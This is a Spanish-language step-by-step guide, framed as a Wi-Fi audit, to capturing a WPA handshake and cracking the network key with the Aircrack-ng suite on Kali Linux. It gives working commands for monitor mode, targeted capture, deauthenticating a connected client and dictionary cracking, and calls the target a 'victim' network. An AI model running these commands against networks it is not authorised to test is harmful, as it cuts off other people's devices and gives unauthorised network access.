## Introducción

Aircrack-ng es una suite de programas que permite realizar auditorías inalámbricas Wifi a routers y puntos de acceso Wifi.

En esta guía aprenderás cómo realizar una auditoría a una red wifi con una lista de contraseñas.

---

## Requisitos

- Kali Linux
- Tarjeta de Wifi con modo monitor

---

## Uso

### Iniciar modo monitor

Lo primero será iniciar el modo monitor de nuestra tarjeta con **airmon-ng**. Se recomienda estar en usuario root.

```bash
iwconfig 
airmon-ng 
airmon-ng start wlan0 
airmon-ng check kill
```

![Informatica](iwconfig.jpg)

---

### Escaneo de redes

Luego iniciamos el escaneo de redes wifi que hay a nuestro alrededor:

```bash
airodump-ng wlan0
```

![Informatica](Scan.jpg)

---

### Selección de canal y captura

Seleccionamos el canal de la red, agregamos un nombre para guardar el archivo de captura y por último el BSSID de la red:

```bash
airodump-ng -c 6 -w auditoria-wifi --bssid 06:A1:51:9A:2F:2F wlan0
```

---

### Desautenticación de dispositivos

Como podemos observar, solo un dispositivo está conectado y es el único que tiene EAPOL. Este será la clave para poder entrar a la red.

Lo primero que haremos será **desconectar el dispositivo de la red**. Seleccionamos el número de veces que va a desautenticar el dispositivo, luego el BSSID de la red y por último el BSSID del dispositivo:

```bash
aireplay-ng -0 50 -a 06:A1:51:9A:2F:2F -c 2E:C7:CB:0E:98:C4 wlan0
```

![Informatica](Desconectar.jpg)

---

### Fase final: Descifrado de contraseña

Usamos el archivo de captura y nuestra lista de contraseñas para obtener la clave de la red.

Ingresamos primero la ubicación de la lista de contraseñas, luego el BSSID de la red y por último el archivo de captura:

```bash
aircrack-ng -w /root/Hacking/Diccionarios/wifi.txt -b 06:A1:51:9A:2F:2F auditoriawifi-01.cap
```

![Informatica](Contraseña.jpg)

---

## Resultado

Como podemos ver, hemos conseguido la contraseña de la red víctima. Dependiendo de la complejidad de la clave, **Aircrack-ng** tardará más o menos en descifrarla.

---